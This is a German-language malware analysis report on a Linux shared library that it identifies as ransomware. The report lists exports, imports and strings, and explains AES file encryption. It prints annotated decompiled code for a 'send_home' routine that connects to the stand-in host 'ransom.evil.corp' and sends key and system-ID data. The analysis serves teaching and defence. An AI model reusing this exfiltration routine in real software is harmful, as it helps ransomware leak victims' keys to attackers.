### Bei der Datei handelt sich um eine Shared-Bibliothek, die von anderen Programmen genutzt werden kann. 

### Exports
---
````
 paddr        size      lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0x000012a0     34     entry0
0x000019b1     75     sym.AES_init_ctx_iv
0x000016c8     703    sym.KeyExpansion
0x00001987     42     sym.AES_init_ctx
0x000019fc     48     sym.AES_ctx_set_iv
0x00002a5b     302    sym.AES_CTR_xcrypt_buffer
0x000013f3     251    sym.encrypt_files
0x00001190     11     sym.imp.opendir
0x00001270     11     sym.imp.exit
0x000011d0     11     sym.imp.memset
0x00001260     11     sym.imp.strcat
0x00001230     11     sym.imp.readdir
0x000011f0     11     sym.imp.closedir
0x000011a0     11     sym.imp.stack_chk_fail
0x00002913     146    sym.AES_CBC_encrypt_buffer
0x000014ee     160    sym.hostname_to_ip
0x00002870     42     sym.AES_ECB_encrypt
0x00002765     144    sym.Cipher
0x000013b8     59     sym.generate_system_id
0x000029a5     182    sym.AES_CBC_decrypt_buffer
0x0000289a     42     sym.AES_ECB_decrypt
0x000027f5     123    sym.InvCipher
0x00001359     95     sym.generate_key
0x00001250     11     sym.imp.open
0x00001200     11     sym.imp.read
0x000011e0     11     sym.imp.close
0x0000158e     314    sym.send_home
0x000012d0     51     sym.register_tm_clones
0x00001310     54     sym.do_global_dtors_aux
0x00001160     11     fcn.00001160
0x00001350     9      sym.frame_dummy
0x00001a2c     165    sym.AddRoundKey
0x00001ad1     124    sym.SubBytes
0x00001b4d     223    sym.ShiftRows
0x00001c2c     49     sym.xtime
0x00001c5d     479    sym.MixColumns
0x00001e3c     1998   sym.InvMixColumns
0x0000260a     124    sym.InvSubBytes
0x00002686     223    sym.InvShiftRows
0x000028c4     79     sym.XorWithIv
0x00002b8c     13     sym._fini
0x00001000     27     sym._init
0x00001170     11     sym.imp.strcpy
0x00001180     11     sym.imp.inet_ntoa
0x000011b0     11     sym.imp.htons
0x000011c0     11     sym.imp.send
0x00001210     11     sym.imp.gethostbyname
0x00001220     11     sym.imp.inet_pton
0x00001280     11     sym.imp.connect
0x00001290     11     sym.imp.socket
0x00001240     11     fcn.00001240
````
### Export Erläuterung
```

`AES_init_ctx_iv`:
Sie wird verwendet, um eine AES-Verschlüsselungssitzung vorzubereiten.

`AES_CBC_encrypt_buffer`:
Verschlüsselt einen Datenpuffer im Cipher Block Chaining (CBC)-Modus unter Verwendung von AES. 

`hostname_to_ip`:
Wandelt einen Hostnamen in die entsprechende IP-Adresse um. Dies ist nützlich, um die IP-Adresse eines Servers zu ermitteln.

`generate_system_id`:
Erstellt eine eindeutige Kennung (ID) für das System. 

`generate_key`:
Generiert einen kryptografischen Schlüssel.
   
`send_home`:
Könnte dazu verwendet werden, Daten oder Informationen an einen zentralen Server oder eine Heimatadresse zu senden. 

`encrypt_files`:
Könnte dazu verwendet werden um bestimmte Daten zu verschlüsseln.
```

### Export Analyse
#### send_home(void *param_1,void *param_2)
````
Die send_home Methode könnte die übergebene Parameter Informationen (param_1 und param_2) an einen Host verschicken und könnte somit eine Hauptrolle spielen. Die Methode benutzt dafür eine weitere Export Methode, die hostname_to_ip.
````
````
undefined8 send_home(void *param_1,void *param_2)
{
  int iVar1; //Host Ip
  int iVar2;
  undefined8 uVar3; //Return Code
  long in_FS_OFFSET;
  sockaddr local_88;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  //Auflösung des Hostnamen "ransom.evil.corp" in eine Ip-Adresse
  iVar1 = hostname_to_ip("ransom.evil.corp",local_78);
  
  //Abfrage, ob Auflösung erfolgt ist
  if (iVar1 == 0) {
    //Erstellung eines Socket zur Ip falls erfolgreich
    iVar1 = socket(2,1,0);
    //Abfrage, ob Erstellung eines Socket erfolgt ist
    if (iVar1 < 0) {
      //Falls die Erstellung fehlgeschlagen ist wird uVar3 auf 0xffffffff gesetzt, um am Ende bei return uVar3 einen Fehler auszugeben
      uVar3 = 0xffffffff;
    }
    //Bei Erfolgreicher Socket Erstellung werden weitere Scoket Einstellungen vorbereitet
    else {
      local_88.sa_family = 2;
      local_88.sa_data._0_2_ = htons(0x1a0a);
      iVar2 = inet_pton(2,local_78,local_88.sa_data + 2);
      //Abfrage, ob die Socket Einstellungen erfolgreich war
      if (iVar2 < 1) {
      	//Fehlhaft
        uVar3 = 0xffffffff;
      }
      else {
        //Socket Einstellung war erfolgreich eine Verbindung zum Host wird erstellt
        iVar2 = connect(iVar1,&local_88,0x10);
        if (iVar2 < 0) {
          //Verbindung ist fehlgeschalgen
          uVar3 = 0xffffffff;
        }
        else {
          //Verbindung war erfolgreich und es werden über diese Informationen gesendet
          send(iVar1,param_1,0x100,0);
          send(iVar1,param_2,0x100,0);
          //Erfolgreiche Ausführung wird mit 0 gekennzeichnet
          uVar3 = 0;
        }
      }
    }
  }
  else {
    //Auflösung des Hostnamen in eine Ip-Adresse ist fehgeschlagen
    uVar3 = 0xffffffff;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
````

#### hostname_to_ip(char *param_1,char *param_2)
````
Die hostname_to_ip wird von der send_home verwendet, um den Hostnamen in eine Ip-Adresse umzuwandeln. Sie verwendet unteranderem nicht einsehbare Importiere Methoden, wie gethostbyname und inet_ntoa, welche bei der Verschlüsselung und Entschlüsselung eine Rolle spielen könnten. 
````
````
undefined8 hostname_to_ip(char *param_1,char *param_2)
{
  hostent *phVar1;
  undefined8 uVar2; //Error Code
  char *__src;
  
  //Auflösung des "ransom.evil.corp" Host in eine Ip
  phVar1 = gethostbyname(param_1);
  
  //Prüfung ob Auflösung Erfolgreich war
  if (phVar1 == (hostent *)0x0) {
    //Falls die Auflösung fehlgeschlagen ist wird uVar3 auf 0xffffffff gesetzt, um am Ende bei return uVar3 einen Fehler auszugeben
    uVar2 = 0xffffffff;
  }
  else if ((in_addr_t *)*phVar1->h_addr_list == (in_addr_t *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    //Bei Erfolg wir die Ip-Adresse möglicherweise entschlüsselt
    __src = inet_ntoa((in_addr)*(in_addr_t *)*phVar1->h_addr_list);
    //und in einen param_2 kopieren, welche man über die Methode übergibt
    strcpy(param_2,__src);
    uVar2 = 0;
  }
  return uVar2;
}
````

### Imports
---
````
 
| Ordinal | Bind    | Type   | Name                                | PLT   |
| ------- | ------- | ------ | ----------------------------------- | ----- |
| 1       | WEAK    | NOTYPE | _ITM_deregisterTMCloneTable         |       |
| 2       | GLOBAL  | FUNC   | strcpy                              | 4464  |
| 3       | GLOBAL  | FUNC   | inet_ntoa                           | 4480  |
| 4       | GLOBAL  | FUNC   | opendir                             | 4496  |
| 5       | GLOBAL  | FUNC   | __stack_chk_fail                    | 4512  |
| 6       | GLOBAL  | FUNC   | htons                               | 4528  |
| 7       | GLOBAL  | FUNC   | send                                | 4544  |
| 8       | GLOBAL  | FUNC   | memset                              | 4560  |
| 9       | GLOBAL  | FUNC   | close                               | 4576  |
| 10      | GLOBAL  | FUNC   | closedir                            | 4592  |
| 11      | GLOBAL  | FUNC   | read                                | 4608  |
| 12      | GLOBAL  | FUNC   | gethostbyname                       | 4624  |
| 13      | WEAK    | NOTYPE | __gmon_start__                      |       |
| 14      | GLOBAL  | FUNC   | inet_pton                           | 4640  |
| 15      | GLOBAL  | FUNC   | readdir                             | 4656  |
| 16      | GLOBAL  | FUNC   | open                                | 4688  |
| 17      | GLOBAL  | FUNC   | strcat                              | 4704  |
| 18      | GLOBAL  | FUNC   | exit                                | 4720  |
| 19      | GLOBAL  | FUNC   | connect                             | 4736  |
| 20      | WEAK    | NOTYPE | _ITM_registerTMCloneTable           |       |
| 21      | WEAK    | FUNC   | __cxa_finalize                      |       |
| 22      | GLOBAL  | FUNC   | socket                              | 4752  |

````
### Import Erläuterung
```

`gethostbyname`:
Wird von der hostname_to_ip benutzt, um möglicherweise den übergeben Host, als Ip-Adresse aufzulösen.

`inet_ntoa`:
Wird ebenfalls von der hostname_to_ip benutzt, um die Ip-Adresse zu verarbeiten.

`send`:
Wird von der send_home benutzt, um möglicherweise Dateien an den Host zu verschicken.
```

### Strings
---
````
[Strings]
nth paddr      vaddr      len size section            type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034 0x00000034 4   10                      utf16le @8\v@
1   0x000002dc 0x000002dc 4   5    .note.gnu.build-id ascii   tVF,
2   0x000006b1 0x000006b1 14  15   .dynstr            ascii   __gmon_start__
3   0x000006c0 0x000006c0 27  28   .dynstr            ascii   _ITM_deregisterTMCloneTable
4   0x000006dc 0x000006dc 25  26   .dynstr            ascii   _ITM_registerTMCloneTable
5   0x000006f6 0x000006f6 14  15   .dynstr            ascii   __cxa_finalize
6   0x00000705 0x00000705 12  13   .dynstr            ascii   generate_key
7   0x00000712 0x00000712 4   5    .dynstr            ascii   open
8   0x00000717 0x00000717 4   5    .dynstr            ascii   exit
9   0x0000071c 0x0000071c 4   5    .dynstr            ascii   read
10  0x00000721 0x00000721 5   6    .dynstr            ascii   close
11  0x00000727 0x00000727 18  19   .dynstr            ascii   generate_system_id
12  0x0000073a 0x0000073a 13  14   .dynstr            ascii   encrypt_files
13  0x00000748 0x00000748 7   8    .dynstr            ascii   opendir
14  0x00000750 0x00000750 6   7    .dynstr            ascii   memset
15  0x00000757 0x00000757 6   7    .dynstr            ascii   strcat
16  0x0000075e 0x0000075e 7   8    .dynstr            ascii   readdir
17  0x00000766 0x00000766 8   9    .dynstr            ascii   closedir
18  0x0000076f 0x0000076f 16  17   .dynstr            ascii   __stack_chk_fail
19  0x00000780 0x00000780 14  15   .dynstr            ascii   hostname_to_ip
20  0x0000078f 0x0000078f 13  14   .dynstr            ascii   gethostbyname
21  0x0000079d 0x0000079d 9   10   .dynstr            ascii   inet_ntoa
22  0x000007a7 0x000007a7 6   7    .dynstr            ascii   strcpy
23  0x000007ae 0x000007ae 9   10   .dynstr            ascii   send_home
24  0x000007b8 0x000007b8 6   7    .dynstr            ascii   socket
25  0x000007bf 0x000007bf 5   6    .dynstr            ascii   htons
26  0x000007c5 0x000007c5 9   10   .dynstr            ascii   inet_pton
27  0x000007cf 0x000007cf 7   8    .dynstr            ascii   connect
28  0x000007d7 0x000007d7 4   5    .dynstr            ascii   send
29  0x000007dc 0x000007dc 12  13   .dynstr            ascii   AES_init_ctx
30  0x000007e9 0x000007e9 15  16   .dynstr            ascii   AES_init_ctx_iv
31  0x000007f9 0x000007f9 14  15   .dynstr            ascii   AES_ctx_set_iv
32  0x00000808 0x00000808 15  16   .dynstr            ascii   AES_ECB_encrypt
33  0x00000818 0x00000818 15  16   .dynstr            ascii   AES_ECB_decrypt
34  0x00000828 0x00000828 22  23   .dynstr            ascii   AES_CBC_encrypt_buffer
35  0x0000083f 0x0000083f 22  23   .dynstr            ascii   AES_CBC_decrypt_buffer
36  0x00000856 0x00000856 21  22   .dynstr            ascii   AES_CTR_xcrypt_buffer
37  0x0000086c 0x0000086c 9   10   .dynstr            ascii   libc.so.6
38  0x00000876 0x00000876 9   10   .dynstr            ascii   GLIBC_2.4
39  0x00000880 0x00000880 11  12   .dynstr            ascii   GLIBC_2.2.5
40  0x0000131b 0x0000131b 4   5    .text              ascii   u+UH
41  0x000013ca 0x000013ca 7   8    .text              ascii   unknown
42  0x000013df 0x000013df 9   10   .text              ascii   127.0.0.H
43  0x00001d22 0x00001d22 4   6    .text              utf8    Hc҈\f blocks=Basic Latin,Cyrillic
44  0x00001d7c 0x00001d7c 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
45  0x00001dd7 0x00001dd7 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
46  0x00001e23 0x00001e23 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
47  0x00001e44 0x00001e44 4   5    .text              ascii   ATSH
48  0x0000206f 0x0000206f 4   6    .text              utf8    Hc҈\f blocks=Basic Latin,Cyrillic
49  0x00002241 0x00002241 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
50  0x00002413 0x00002413 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
51  0x000025ea 0x000025ea 4   6    .text              utf8    Hc҈L blocks=Basic Latin,Cyrillic
52  0x00002605 0x00002605 4   5    .text              ascii   [A\]
53  0x000027b1 0x000027b1 4   5    .text              ascii   \nt(H
54  0x00003000 0x00003000 12  13   .rodata            ascii   /dev/urandom
55  0x0000300d 0x0000300d 16  17   .rodata            ascii   ransom.evil.corp
56  0x00003020 0x00003020 4   5    .rodata            ascii   c|w{
57  0x00003068 0x00003068 4   6    .rodata            utf8    R;ֳ) blocks=Basic Latin,Hebrew
58  0x00003077 0x00003077 7   9    .rodata            utf8    [j˾9JLX blocks=Basic Latin,Spacing Modifier Letters
59  0x000030a8 0x000030a8 5   7    .rodata            utf8    ħ~=d] blocks=Latin Extended-A,Basic Latin
60  0x000030c1 0x000030c1 4   5    .rodata            ascii   2:\nI
61  0x00003170 0x00003170 4   5    .rodata            ascii   lpHP
62  0x0000321b 0x0000321b 5   6    .rodata            ascii   cU!\f}
63  0x00003328 0x00003328 4   5    .eh_frame          ascii   \e\f\a\b
64  0x0000334f 0x0000334f 5   6    .eh_frame          ascii   :*3$"
65  0x000033a2 0x000033a2 4   5    .eh_frame          ascii   V\f\a\b
66  0x000033c1 0x000033c1 4   5    .eh_frame          ascii   r\f\a\b
67  0x00003461 0x00003461 4   5    .eh_frame          ascii   a\f\a\b
68  0x00003482 0x00003482 4   5    .eh_frame          ascii   B\f\a\b
69  0x000034a1 0x000034a1 4   5    .eh_frame          ascii   g\f\a\b
70  0x000034e2 0x000034e2 4   5    .eh_frame          ascii   s\f\a\b
71  0x00003521 0x00003521 4   5    .eh_frame          ascii   h\f\a\b
72  0x00003568 0x00003568 4   5    .eh_frame          ascii   \a\f\a\b
73  0x00003586 0x00003586 4   5    .eh_frame          ascii   s\f\a\b
74  0x000035e6 0x000035e6 4   5    .eh_frame          ascii   r\f\a\b
75  0x00003605 0x00003605 4   5    .eh_frame          ascii   a\f\a\b
76  0x00003625 0x00003625 4   5    .eh_frame          ascii   a\f\a\b
77  0x00003646 0x00003646 4   5    .eh_frame          ascii   F\f\a\b
78  0x000040b8 0x00000000 42  43   .comment           ascii   GCC: (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0
79  0x00004791 0x00000001 10  11   .strtab            ascii   crtstuff.c
80  0x0000479c 0x0000000c 20  21   .strtab            ascii   deregister_tm_clones
81  0x000047b1 0x00000021 21  22   .strtab            ascii   __do_global_dtors_aux
82  0x000047c7 0x00000037 11  12   .strtab            ascii   completed.0
83  0x000047d3 0x00000043 38  39   .strtab            ascii   __do_global_dtors_aux_fini_array_entry
84  0x000047fa 0x0000006a 11  12   .strtab            ascii   frame_dummy
85  0x00004806 0x00000076 30  31   .strtab            ascii   __frame_dummy_init_array_entry
86  0x00004825 0x00000095 11  12   .strtab            ascii   payload_2.c
87  0x00004831 0x000000a1 5   6    .strtab            ascii   aes.c
88  0x00004837 0x000000a7 5   6    .strtab            ascii   rsbox
89  0x0000483d 0x000000ad 4   5    .strtab            ascii   Rcon
90  0x00004842 0x000000b2 12  13   .strtab            ascii   KeyExpansion
91  0x0000484f 0x000000bf 11  12   .strtab            ascii   AddRoundKey
92  0x0000485b 0x000000cb 5   6    .strtab            ascii   xtime
93  0x00004861 0x000000d1 13  14   .strtab            ascii   InvMixColumns
94  0x0000486f 0x000000df 11  12   .strtab            ascii   InvSubBytes
95  0x0000487b 0x000000eb 12  13   .strtab            ascii   InvShiftRows
96  0x00004888 0x000000f8 9   10   .strtab            ascii   InvCipher
97  0x00004892 0x00000102 9   10   .strtab            ascii   XorWithIv
98  0x0000489c 0x0000010c 13  14   .strtab            ascii   __FRAME_END__
99  0x000048aa 0x0000011a 5   6    .strtab            ascii   _fini
100 0x000048b0 0x00000120 12  13   .strtab            ascii   __dso_handle
101 0x000048bd 0x0000012d 8   9    .strtab            ascii   _DYNAMIC
102 0x000048c6 0x00000136 18  19   .strtab            ascii   __GNU_EH_FRAME_HDR
103 0x000048d9 0x00000149 11  12   .strtab            ascii   __TMC_END__
104 0x000048e5 0x00000155 21  22   .strtab            ascii   _GLOBAL_OFFSET_TABLE_
105 0x000048fb 0x0000016b 5   6    .strtab            ascii   _init
106 0x00004901 0x00000171 13  14   .strtab            ascii   encrypt_files
107 0x0000490f 0x0000017f 27  28   .strtab            ascii   _ITM_deregisterTMCloneTable
108 0x0000492b 0x0000019b 22  23   .strtab            ascii   AES_CBC_encrypt_buffer
109 0x00004942 0x000001b2 18  19   .strtab            ascii   strcpy@GLIBC_2.2.5
110 0x00004955 0x000001c5 21  22   .strtab            ascii   inet_ntoa@GLIBC_2.2.5
111 0x0000496b 0x000001db 19  20   .strtab            ascii   opendir@GLIBC_2.2.5
112 0x0000497f 0x000001ef 22  23   .strtab            ascii   AES_CBC_decrypt_buffer
113 0x00004996 0x00000206 26  27   .strtab            ascii   __stack_chk_fail@GLIBC_2.4
114 0x000049b1 0x00000221 17  18   .strtab            ascii   htons@GLIBC_2.2.5
115 0x000049c3 0x00000233 16  17   .strtab            ascii   send@GLIBC_2.2.5
116 0x000049d4 0x00000244 15  16   .strtab            ascii   AES_init_ctx_iv
117 0x000049e4 0x00000254 15  16   .strtab            ascii   AES_ECB_decrypt
118 0x000049f4 0x00000264 18  19   .strtab            ascii   memset@GLIBC_2.2.5
119 0x00004a07 0x00000277 12  13   .strtab            ascii   AES_init_ctx
120 0x00004a14 0x00000284 17  18   .strtab            ascii   close@GLIBC_2.2.5
121 0x00004a26 0x00000296 20  21   .strtab            ascii   closedir@GLIBC_2.2.5
122 0x00004a3b 0x000002ab 14  15   .strtab            ascii   AES_ctx_set_iv
123 0x00004a4a 0x000002ba 16  17   .strtab            ascii   read@GLIBC_2.2.5
124 0x00004a5b 0x000002cb 25  26   .strtab            ascii   gethostbyname@GLIBC_2.2.5
125 0x00004a75 0x000002e5 21  22   .strtab            ascii   AES_CTR_xcrypt_buffer
126 0x00004a8b 0x000002fb 14  15   .strtab            ascii   __gmon_start__
127 0x00004a9a 0x0000030a 21  22   .strtab            ascii   inet_pton@GLIBC_2.2.5
128 0x00004ab0 0x00000320 19  20   .strtab            ascii   readdir@GLIBC_2.2.5
129 0x00004ac4 0x00000334 14  15   .strtab            ascii   hostname_to_ip
130 0x00004ad3 0x00000343 12  13   .strtab            ascii   generate_key
131 0x00004ae0 0x00000350 16  17   .strtab            ascii   open@GLIBC_2.2.5
132 0x00004af1 0x00000361 18  19   .strtab            ascii   strcat@GLIBC_2.2.5
133 0x00004b04 0x00000374 16  17   .strtab            ascii   exit@GLIBC_2.2.5
134 0x00004b15 0x00000385 19  20   .strtab            ascii   connect@GLIBC_2.2.5
135 0x00004b29 0x00000399 25  26   .strtab            ascii   _ITM_registerTMCloneTable
136 0x00004b43 0x000003b3 9   10   .strtab            ascii   send_home
137 0x00004b4d 0x000003bd 26  27   .strtab            ascii   __cxa_finalize@GLIBC_2.2.5
138 0x00004b68 0x000003d8 15  16   .strtab            ascii   AES_ECB_encrypt
139 0x00004b78 0x000003e8 18  19   .strtab            ascii   generate_system_id
140 0x00004b8b 0x000003fb 18  19   .strtab            ascii   socket@GLIBC_2.2.5
141 0x00004b9f 0x00000001 7   8    .shstrtab          ascii   .symtab
142 0x00004ba7 0x00000009 7   8    .shstrtab          ascii   .strtab
143 0x00004baf 0x00000011 9   10   .shstrtab          ascii   .shstrtab
144 0x00004bb9 0x0000001b 18  19   .shstrtab          ascii   .note.gnu.property
145 0x00004bcc 0x0000002e 18  19   .shstrtab          ascii   .note.gnu.build-id
146 0x00004bdf 0x00000041 9   10   .shstrtab          ascii   .gnu.hash
147 0x00004be9 0x0000004b 7   8    .shstrtab          ascii   .dynsym
148 0x00004bf1 0x00000053 7   8    .shstrtab          ascii   .dynstr
149 0x00004bf9 0x0000005b 12  13   .shstrtab          ascii   .gnu.version
150 0x00004c06 0x00000068 14  15   .shstrtab          ascii   .gnu.version_r
151 0x00004c15 0x00000077 9   10   .shstrtab          ascii   .rela.dyn
152 0x00004c1f 0x00000081 9   10   .shstrtab          ascii   .rela.plt
153 0x00004c29 0x0000008b 5   6    .shstrtab          ascii   .init
154 0x00004c2f 0x00000091 8   9    .shstrtab          ascii   .plt.got
155 0x00004c38 0x0000009a 8   9    .shstrtab          ascii   .plt.sec
156 0x00004c41 0x000000a3 5   6    .shstrtab          ascii   .text
157 0x00004c47 0x000000a9 5   6    .shstrtab          ascii   .fini
158 0x00004c4d 0x000000af 7   8    .shstrtab          ascii   .rodata
159 0x00004c55 0x000000b7 13  14   .shstrtab          ascii   .eh_frame_hdr
160 0x00004c63 0x000000c5 9   10   .shstrtab          ascii   .eh_frame
161 0x00004c6d 0x000000cf 11  12   .shstrtab          ascii   .init_array
162 0x00004c79 0x000000db 11  12   .shstrtab          ascii   .fini_array
163 0x00004c85 0x000000e7 8   9    .shstrtab          ascii   .dynamic
164 0x00004c8e 0x000000f0 8   9    .shstrtab          ascii   .got.plt
165 0x00004c97 0x000000f9 5   6    .shstrtab          ascii   .data
166 0x00004c9d 0x000000ff 4   5    .shstrtab          ascii   .bss
167 0x00004ca2 0x00000104 8   9    .shstrtab          ascii   .comment


````
### Interessante Strings
```
54  0x00003000 0x00003000 12  13   .rodata            ascii   /dev/urandom
55  0x0000300d 0x0000300d 16  17   .rodata            ascii   ransom.evil.corp
```
Zufallszahlen für den Schlüssel  wurden durch urandom erzeugt .
ransom.evil.corp  ist der Control-Server für Ransomware

### Möglicher Zweck
---
Die Bibliothek exportiert Verschlüsselungsfunktionen (AES_*) und beinhaltet auch Funktionen, die darauf hinweisen, dass Dateien mit einem neu generierten Schlüssel verschlüsselt werden können. 
 Socket-Funktionen sind vorhanden :es gibt eine Kommunikation mit dem Internet

Es ist höchstwahrscheinlich eine Bibliothek im Kontext von Verschlüsselung der Ransomware.


Es könnte sich um Maleware handeln, welche versucht Dateien des Opfers zu verschlüsseln und gegen Geld zu entschlüsseln.

